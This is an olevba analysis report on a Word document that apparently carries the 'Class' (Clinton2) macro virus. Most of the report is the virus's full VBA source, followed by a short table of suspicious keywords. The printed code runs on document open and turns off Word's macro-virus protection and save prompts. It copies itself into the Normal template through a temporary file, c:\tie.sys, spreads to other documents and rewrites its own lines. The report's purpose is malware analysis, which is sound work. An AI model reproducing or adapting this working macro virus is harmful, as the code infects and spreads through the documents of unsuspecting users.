olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.Clinton2-89e746123146229955117083a335f636788b634a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.Clinton2-89e746123146229955117083a335f636788b634a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'Testertest
On Error GoTo 73
'Testertest
Options.VirusProtection = False
'Testertest
Options.SaveNormalPrompt = False
'Testertest
Options.ConfirmConversions = False
'Testertest
ties = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Testertest
tier = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Testertest
If tier > 74 And ties > 0 Then GoTo 73
'Testertest
If tier < 74 Then
'Testertest
 Set tvir = NormalTemplate.VBProject.VBComponents.Item(1)
'Testertest
 ActiveDocument.VBProject.VBComponents.Item(1).Name = tvir.Name
'Testertest
 ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\tie.sys"
'Testertest
End If
'Testertest
If ties = 0 Then Set tvir = ActiveDocument.VBProject.VBComponents.Item(1)
'Testertest
 Infection = Int(Rnd * 100)
'Testertest
 If Infection = 99 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(84) + Chr(105) + Chr(69) + Chr(32) + Chr(66) + Chr(121) + Chr(32) + Chr(86) + Chr(105) + Chr(82) + Chr(117) + Chr(83)
'Testertest
 If Day(Now) = 1 And (Month(Now) > 1) Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(80) + Chr(82) + Chr(79) + Chr(32) + Chr(86) + Chr(105) + Chr(82) + Chr(117) + Chr(83)
'Testertest
 tvir.codemodule.AddFromFile ("c:\tie.sys")
'Testertest
 With tvir.codemodule
'Testertest
    For x = 1 To 4
'Testertest
    .deletelines 1
'Testertest
    Next x
'Testertest
 End With
'Testertest
 If tier < 74 Then
'Testertest
    With tvir.codemodule
'Testertest
    .replaceline 1, "Sub AutoClose()"
'Testertest
    .replaceline 79, "Sub ToolsMacro()"
'Testertest
    rd1 = Int(Rnd * 25)
'Testertest
 If rd1 = 24 Then .replaceline 67, ".replaceline x, ""'"" & Application.ActivePrinter & Application.ActiveWindow"
'Testertest
End With
'Testertest
 End If
'Testertest
 With tvir.codemodule
'Testertest
    For x = 2 To 76 Step 2
'Testertest
    .replaceline x, "'" & Application.UserName & Application.ActiveWindow
'Testertest
    Next x
'Testertest
 End With
'Testertest
73:
'Testertest
 If tier > 74 And ties = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Testertest
 End Sub

Sub ViewVBCode()

End Sub





+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+
